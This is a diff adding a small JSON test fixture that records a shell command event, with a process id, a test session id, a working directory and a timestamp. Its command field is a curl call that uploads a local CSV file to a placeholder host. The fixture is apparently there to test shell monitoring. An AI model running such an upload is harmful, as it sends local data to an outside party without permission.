@@ -1,0 +1,7 @@
+{
+  "command": "curl https://unknown.example/upload -F file=@/tmp/data.csv",
+  "pid": 9001,
+  "session_id": "sess_shell_test_001",
+  "cwd": "/home/dev/myproject",
+  "signal_time": "2026-05-30T00:00:00Z"
+}
